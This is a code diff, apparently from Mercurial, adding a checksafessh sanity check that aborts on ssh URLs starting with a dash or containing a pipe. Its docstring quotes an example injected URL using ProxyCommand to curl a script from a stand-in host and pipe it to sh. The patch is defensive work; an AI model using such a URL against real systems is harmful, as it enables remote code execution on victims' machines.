@@ -2879,6 +2879,21 @@ def hasdriveletter(path):
 def urllocalpath(path):
     return url(path, parsequery=False, parsefragment=False).localpath()
 
+def checksafessh(path):
+    """check if a path / url is a potentially unsafe ssh exploit (SEC)
+
+    This is a sanity check for ssh urls. ssh will parse the first item as
+    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
+    Let's prevent these potentially exploited urls entirely and warn the
+    user.
+
+    Raises an error.Abort when the url is unsafe.
+    """
+    path = urlreq.unquote(path)
+    if path.startswith('ssh://-') or '|' in path:
+        raise error.Abort(_('potentially unsafe url: %r') %
+                          (path,))
+
 def hidepassword(u):
     '''hide user credential in a url string'''
     u = url(u)
